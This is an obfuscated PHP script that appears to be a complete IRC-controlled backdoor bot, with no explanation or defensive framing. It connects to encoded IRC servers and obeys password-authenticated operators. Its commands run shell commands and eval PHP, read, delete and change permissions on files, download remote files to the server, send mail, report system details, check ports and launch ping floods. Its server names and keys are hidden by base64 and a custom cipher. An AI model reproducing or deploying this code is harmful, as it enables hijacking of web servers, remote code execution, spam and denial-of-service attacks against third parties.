<? set_time_limit(0); ini_set("max_execution_time",0); set_magic_quotes_runtime(0); ini_set('output_buffering',0);
error_reporting(0); ignore_user_abort(); $cd263a566 = array ( "po" => 8080, "sp" => "qdHH3KWXlISXmA==",
 "ch" => "WY/U", "ke" => "o9CZ0qGWjA==", "ha" => "ZaaOi2pjTlGFm1dS", "pa" => "b9DInqVXWlRWW2uGbGVmaJlpmKRoomrPnWmgmKqpxq0=",
 "tr" => "*", "mrnd" => 9, "mo" => "LXggaQ==", "ve" => "bUlSQyA2LjI0IEJZIEtoYWxlZCBNYXJkYW0tQmF5"
); function nc8a89c2c($d341be97d) { $d341be97d = str_replace(" ", "", $d341be97d); return $d341be97d;
} function p9ccc9fce($d341be97d) { $d341be97d = base64_decode(nc8a89c2c($d341be97d)); return $d341be97d;
} function y658cce19() { global $cd263a566; $gee11cbb1 = array(); $cd707b814 = ""; $w59b51417 = array("qeHS2LmTkISHiqZRq5qYmKGnY8+i2Q==", "o+XR37OMh5OQhpaIYqyYmZeiqJqW26M=", "mtrXnm6FlIRSk6g=", "mtrXnW6FlIRSk6g=", "mtrXnG6FlIRSk6g=", "mtrXm26FlIRSk6g=", "qdrJ3W6HkoyUU6GIqA==", "qdrJ3W6SlIiSiaGWYpeY", "pN/J3XFRiIdSh5+YmaGcophil9E=", "rs3R47hRiJGNlWGRmak=");
shuffle($w59b51417); if(($x351a1d2a = fsockopen(u39c63ddb($w59b51417[0]),$cd263a566['po'],$k70106d0d,$q809b1abe,15))) {
$q80521467 = gd9889714($cd263a566['mrnd']); if (strlen($cd263a566['sp'])>0) { o56eacb30($x351a1d2a, p9ccc9fce("UEFTUw==")." ".u39c63ddb($cd263a566['sp']));
} o56eacb30($x351a1d2a, p9ccc9fce("VVNFUg==")." ".rfb0daa8f($cd263a566['mrnd'])." 127.0.0.1 localhost :$q80521467");
o56eacb30($x351a1d2a, p9ccc9fce("TklDSw==")." $q80521467"); while (!feof($x351a1d2a)) { $e7fabc140 = trim(fgets($x351a1d2a,512));
$i6e2baaf3 = explode(" ",$e7fabc140); if(($e7fabc140 == $cd707b814)) continue; if (isset($i6e2baaf3[0]) && $i6e2baaf3[0] == p9ccc9fce("UElORw==")) {
o56eacb30($x351a1d2a, p9ccc9fce("UE9ORw==")." ".$i6e2baaf3[1]); } else if (isset($i6e2baaf3[1]) && $i6e2baaf3[1] == p9ccc9fce("MDAx")) {
o56eacb30($x351a1d2a, p9ccc9fce("TU9ERQ==")." $q80521467 ".p9ccc9fce($cd263a566['mo'])); o56eacb30($x351a1d2a, p9ccc9fce("Sk9JTg==")." ".u39c63ddb($cd263a566['ch'])." ".u39c63ddb($cd263a566['ke']));
} else if(isset($sdfff0a7f[1]) && $sdfff0a7f[1] == p9ccc9fce("NDMz")) { o56eacb30($x351a1d2a, p9ccc9fce("TklDSw==")." $q80521467");
} else if (isset($i6e2baaf3[1]) && isset($gee11cbb1[$i6e2baaf3[1]])) { unset($gee11cbb1[$i6e2baaf3[1]]);
} else if (isset($i6e2baaf3[1]) && ($i6e2baaf3[1] == p9ccc9fce("UFJJVk1TRw==") || $i6e2baaf3[1] == p9ccc9fce("MzMy"))) {
$o78e73102 = strstr($e7fabc140," :"); $o78e73102 = substr($o78e73102,2); $sdfff0a7f = explode(" ",$o78e73102);
$p67b3dba8 = $i6e2baaf3[0]; $a7c6483dd = explode("!",$p67b3dba8); $a7c6483dd = substr($a7c6483dd[0],1);
$y73be252c = FALSE; if ($sdfff0a7f[0] == "\1".p9ccc9fce("VkVSU0lPTg==")."\1") { o56eacb30($x351a1d2a,"NOTICE ".$a7c6483dd." :\1".p9ccc9fce("VkVSU0lPTg==")." ".p9ccc9fce($cd263a566['ve'])."\1");
} for ($r865c0c0b=0;$r865c0c0b<count($sdfff0a7f);$r865c0c0b++) { if($sdfff0a7f[$r865c0c0b] == "-s") {
$y73be252c = TRUE; } } if ($i6e2baaf3[1] == p9ccc9fce("MzMy")) { $w01b6e203 = $i6e2baaf3[3]; } elseif ($i6e2baaf3[2] == $q80521467) {
$w01b6e203 = $a7c6483dd; } else { $w01b6e203 = $i6e2baaf3[2]; } if ($sdfff0a7f[0] == PHP_OS) { array_shift($sdfff0a7f);
} if (substr($sdfff0a7f[0],0,1) == $cd263a566['tr']) { if (isset($gee11cbb1[$p67b3dba8]) || $i6e2baaf3[1] == "332") {
switch (substr($sdfff0a7f[0],1)) { case p9ccc9fce("bG8="): if ($i6e2baaf3[1] != p9ccc9fce("MzMy")) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "out"); } break; case p9ccc9fce("ZDFlbm93"): o56eacb30($x351a1d2a, p9ccc9fce("UVVJVCA6SSBRVUlU"));
fclose($x351a1d2a); exit(0); break; case p9ccc9fce("cmF3"): if (count($sdfff0a7f)>1) { o56eacb30($x351a1d2a, substr($o78e73102,strlen($sdfff0a7f[0])));
} break; case p9ccc9fce("bHM="): if (isset($sdfff0a7f[1])) { $z954eef6d = $sdfff0a7f[1]; } else { $z954eef6d = getcwd();
} if (is_dir($z954eef6d)) { if (($g73600783 = opendir($z954eef6d))) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Dir// Now listing: \2".$z954eef6d."\2");
while (($a435ed7e9 = readdir($g73600783)) !== FALSE) { if ($a435ed7e9 != "." && $a435ed7e9 != "..") {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "> (".filetype($z954eef6d."/".$a435ed7e9).") $a435ed7e9");
sleep(1); } } closedir(); } else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Dir// Unable to list contents of \2".$z954eef6d."\2");
} } else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Dir// \2".$z954eef6d."\2 is not a dir!");
} break; case p9ccc9fce("Y2F0"): if (count($sdfff0a7f) > 1) { if (is_file($sdfff0a7f[1])) { if (($p0666f0ac = fopen($sdfff0a7f[1],"r"))) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CAT// Now reading file: \2".$sdfff0a7f[1]."\2"); while(!feof($p0666f0ac)) {
$f6438c669 = trim(fgets($p0666f0ac,256)); yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "> $f6438c669");
sleep(1); } yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "> [EOF]"); } else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CAT// Couldn't open \2".$sdfff0a7f[1]."\2 for reading.");
} } else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CAT// \2".$sdfff0a7f[1]."\2 is not a file");
} } break; case p9ccc9fce("cHdk"): yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "PWD// Current dir: ".getcwd());
break; case p9ccc9fce("Y2Q="): if (count($sdfff0a7f) > 1) { if (chdir($sdfff0a7f[1])) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CD// Changed dir to ".$sdfff0a7f[1]);
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CD// Failed to change dir"); } } break; case p9ccc9fce("cm0="):
if (count($sdfff0a7f) > 1) { if (unlink($sdfff0a7f[1])) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "RM// Deleted \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "RM// Failed to delete \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("dG91Y2g="): if (count($sdfff0a7f) > 1) { if (touch($sdfff0a7f[1])) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Touch// Touched \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Touch// Failed to touch \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("c3ltbGluaw=="): if (count($sdfff0a7f) > 2) { if (symlink($sdfff0a7f[1],$sdfff0a7f[2])) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "SymLink// Symlinked \2".$sdfff0a7f[2]."\2 To \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "SymLink// Failed to link \2".$sdfff0a7f[2]."\2 To \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("Y2hvd24="): if (count($sdfff0a7f) > 2) { if (chown($sdfff0a7f[1],$sdfff0a7f[2])) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Chown// Chowned \2".$sdfff0a7f[1]."\2 To \2".$sdfff0a7f[2]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Chown// Failed to chown \2".$sdfff0a7f[1]."\2 To \2".$sdfff0a7f[2]."\2");
} } break; case p9ccc9fce("Y2htb2Q="): if (count($sdfff0a7f) > 2) { if(chmod($sdfff0a7f[1],$sdfff0a7f[2])) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Chmod// Chmodded \2".$sdfff0a7f[1]."\2 with permissions \2".$sdfff0a7f[2]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Chmod// Failed to chmod \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("bWtkaXI="): if (count($sdfff0a7f) > 1) { if (mkdir($sdfff0a7f[1])) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "MKDir// Created directory \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "MKDir// Failed to create directory \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("cm1k"): if (count($sdfff0a7f)>1) { if (rmdir($sdfff0a7f[1])) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "RMDir// Removed directory \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "RMDir// Failed to remove directory \2".$sdfff0a7f[1]."\2");
} } break; case p9ccc9fce("Y3A="): if (count($sdfff0a7f) > 2) { if (copy($sdfff0a7f[1], $sdfff0a7f[2])) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CP// Copied \2".$sdfff0a7f[1]."\2 to \2".$sdfff0a7f[2]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "CP// Failed to copy \2".$sdfff0a7f[1]."\2 to \2".$sdfff0a7f[2]."\2");
} } break; case p9ccc9fce("bWFpbA=="): if (count($sdfff0a7f)>4) { $t099fb995 = "From: <".$sdfff0a7f[2].">\r\n";
if (mail($sdfff0a7f[1], $sdfff0a7f[3], substr($o78e73102,$sdfff0a7f[4]), $t099fb995)) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Mailer// Message sent to \2".$sdfff0a7f[1]."\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Mailer// Send failure"); } } break; case p9ccc9fce("bWttZDU="):
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "MD5// ".md5($sdfff0a7f[1])); break; case p9ccc9fce("ZG5z"):
if (isset($sdfff0a7f[1])) { $r957b527b = explode(".",$sdfff0a7f[1]); if (count($r957b527b)==4 && is_numeric($r957b527b[0]) && is_numeric($r957b527b[1]) && is_numeric($r957b527b[2]) && is_numeric($r957b527b[3])) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "DNS// ".$sdfff0a7f[1]." -> ".gethostbyaddr($sdfff0a7f[1]));
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "DNS// ".$sdfff0a7f[1]." -> ".gethostbyname($sdfff0a7f[1]));
} } break; case p9ccc9fce("b3BtZQ=="): o56eacb30($x351a1d2a, "mode ".$i6e2baaf3[2]." +o $a7c6483dd");
break; case p9ccc9fce("cmVzdGFydA=="): o56eacb30($x351a1d2a, p9ccc9fce("UVVJVCA6UVVJVC4uLg==")); fclose($x351a1d2a);
y658cce19(); break; case p9ccc9fce("cm4="): if(isset($sdfff0a7f[1])) { $q80521467 = gd9889714((int)$sdfff0a7f[1]);
o56eacb30($x351a1d2a, p9ccc9fce("TklDSw==")." $q80521467"); } else { $q80521467 = gd9889714($cd263a566['mrnd']);
o56eacb30($x351a1d2a, p9ccc9fce("TklDSw==")." $q80521467"); } break; case p9ccc9fce("cGhw"): if (count($sdfff0a7f) > 1) {
eval(substr($o78e73102,strlen($sdfff0a7f[0]))); } break; case p9ccc9fce("Z2V0"): if (count($sdfff0a7f) > 2) {
if (!($p0666f0ac = fopen($sdfff0a7f[2],"w"))) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Get// Permission denied");
} else { if (!($qb5eda0a7 = file($sdfff0a7f[1]))) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Get// Bad URL/DNS error");
} else { for ($r865c0c0b = 0; $r865c0c0b < count($qb5eda0a7); $r865c0c0b++) { fwrite($p0666f0ac,$qb5eda0a7[$r865c0c0b]);
} yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Get// \2".$sdfff0a7f[1]."\2 downloaded to \2".$sdfff0a7f[2]."\2");
} fclose($p0666f0ac); } } break; case p9ccc9fce("bmk="): yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "NetInfo// IP: ".$_SERVER['SERVER_ADDR']." Hostname: ".$_SERVER['SERVER_NAME']);
break; case p9ccc9fce("c2k="): yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Sysinfo// [User: ".get_current_user()."] [PID: ".getmypid()."] [Version: PHP ".phpversion()."] [OS: ".PHP_OS."] [Server_software: ".$_SERVER['SERVER_SOFTWARE']."] [Server_name: ".$_SERVER['SERVER_NAME']."] [Admin: ".$_SERVER['SERVER_ADMIN']."] [Docroot: ".$_SERVER['DOCUMENT_ROOT']."] [HTTP Host: ".$_SERVER['HTTP_HOST']."] [URL: ".$_SERVER['REQUEST_URI']."]");
break; case p9ccc9fce("cG9ydG9wZW4="): if (isset($sdfff0a7f[1],$sdfff0a7f[2])) { if (fsockopen($sdfff0a7f[1],(int)$sdfff0a7f[2],$k56bd7107,$d341be97d,5)) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "PortChk// ".$sdfff0a7f[1].":".$sdfff0a7f[2]." is \2Open\2");
} else { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "PortChk// ".$sdfff0a7f[1].":".$sdfff0a7f[2]." is \2Closed\2");
} } break; case p9ccc9fce("dW5hbWU="): yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Uname// ".php_uname());
break; case p9ccc9fce("aWQ="): yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "ID// ".getmypid()); break;
case p9ccc9fce("Y21k"): if (count($sdfff0a7f)>1) { $j1dccadfe = popen(substr($o78e73102,strlen($sdfff0a7f[0])),"r");
while (!feof($j1dccadfe)) { $a734515cb = trim(fgets($j1dccadfe,512)); if (strlen($a734515cb)>0) { yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "> ".$a734515cb);
sleep(1); } } yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "> [EOF]"); } break; case p9ccc9fce("ZXhlYw=="):
v54d54a12(substr($o78e73102,strlen($sdfff0a7f[0]))); break; case p9ccc9fce("aGl0"): if (!$sdfff0a7f[1] || !$sdfff0a7f[2]) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Hit// Need some cmds."); break; } if ($sdfff0a7f[2] > 100) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Hit// too much sockets. setting to 100."); $sdfff0a7f[2] = 100;
} yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Hit// $sdfff0a7f[1] with $sdfff0a7f[2] pkts."); lbeee853c($sdfff0a7f[1],$sdfff0a7f[2]);
break; } } else { switch(substr($sdfff0a7f[0],1)) { case p9ccc9fce("Kg=="): if (isset($sdfff0a7f[1]) && md5($sdfff0a7f[1]) == u39c63ddb($cd263a566['pa']) && preg_match(u39c63ddb($cd263a566['ha']),$p67b3dba8)) {
yf2f4e964($x351a1d2a, $y73be252c, $w01b6e203, "Ready// Login Ok: \2$a7c6483dd\2"); $gee11cbb1[$p67b3dba8] = TRUE;
} else { yf2f4e964($x351a1d2a, FALSE, $cd263a566['ch'], "Ready// Login rejected: \2$a7c6483dd\2"); }
break; } } } } $cd707b814 = $e7fabc140; } fclose($x351a1d2a); sleep(3); y658cce19(); } else { shuffle($w59b51417);
y658cce19(); } } function o56eacb30($x317d37b0, $o78e73102) { fwrite($x317d37b0,"$o78e73102\r\n"); }
function yf2f4e964($x317d37b0, $y73be252c, $w01b6e203, $o78e73102) { if($y73be252c != TRUE) { o56eacb30($x317d37b0, p9ccc9fce("UFJJVk1TRw==")." $w01b6e203 :$o78e73102");
} } function gd9889714($ufac65290) { for ($r865c0c0b = 0; $r865c0c0b < $ufac65290; $r865c0c0b++) $v2cb9df98 .= chr(mt_rand(0,25)+97);
if (posix_getegid() == 0) $v2cb9df98 = "r-".$v2cb9df98; return $v2cb9df98; } function v54d54a12($p111ca5df)
{ $z9b207167 = ''; if (!empty($p111ca5df)) { if(function_exists('exec')) { @exec($p111ca5df,$z9b207167);
$z9b207167 = join("\n",$z9b207167); } elseif(function_exists('shell_exec')) { $z9b207167 = @shell_exec($p111ca5df);
} elseif(function_exists('system')) { @ob_start(); @system($p111ca5df); $z9b207167 = @ob_get_contents();
@ob_end_clean(); } elseif(function_exists('passthru')) { @ob_start(); @passthru($p111ca5df); $z9b207167 = @ob_get_contents();
@ob_end_clean(); } elseif(@is_resource($t8fa14cdd = @popen($p111ca5df,"r"))) { $z9b207167 = ""; while(!@feof($t8fa14cdd)) { $z9b207167 .= @fread($t8fa14cdd,1024); }
@pclose($t8fa14cdd); } } return $z9b207167; } function lbeee853c($p67b3dba8,$dc9c17db3) { v54d54a12("ping -p 2222f2b22 -s 512 -t 255 -c $dc9c17db3 $p67b3dba8");
} function u39c63ddb($ac7a1ddb1) { $bb4a88417 = ''; $ac7a1ddb1 = base64_decode($ac7a1ddb1); for($r865c0c0b=0; $r865c0c0b<strlen($ac7a1ddb1); $r865c0c0b++) {
$ra87deb01 = substr($ac7a1ddb1, $r865c0c0b, 1); $lae0e1268 = substr(p9ccc9fce("bGRqQCMkIyQlMyM0NTM0MzQ1bDNsNmpsNGs1dHJld3VpdHJlaXRyZXRFcnR3ZXJUd2VydCQlMzQzMjQ1NmtsJl4qNjc4Njc4XiYqXiY4NWo0bGs2ajM0bDZqbDM0Ng=="), ($r865c0c0b % strlen(p9ccc9fce("bGRqQCMkIyQlMyM0NTM0MzQ1bDNsNmpsNGs1dHJld3VpdHJlaXRyZXRFcnR3ZXJUd2VydCQlMzQzMjQ1NmtsJl4qNjc4Njc4XiYqXiY4NWo0bGs2ajM0bDZqbDM0Ng==")))-1, 1);
$ra87deb01 = chr(ord($ra87deb01)-ord($lae0e1268)); $bb4a88417.=$ra87deb01; } return $bb4a88417; } function rfb0daa8f($ufac65290) {
$v2cb9df98 = ""; for ($r865c0c0b=0;$r865c0c0b<$ufac65290; $r865c0c0b++) $v2cb9df98 .= chr(mt_rand(0,25)+97);
return $v2cb9df98; } y658cce19(); ?> 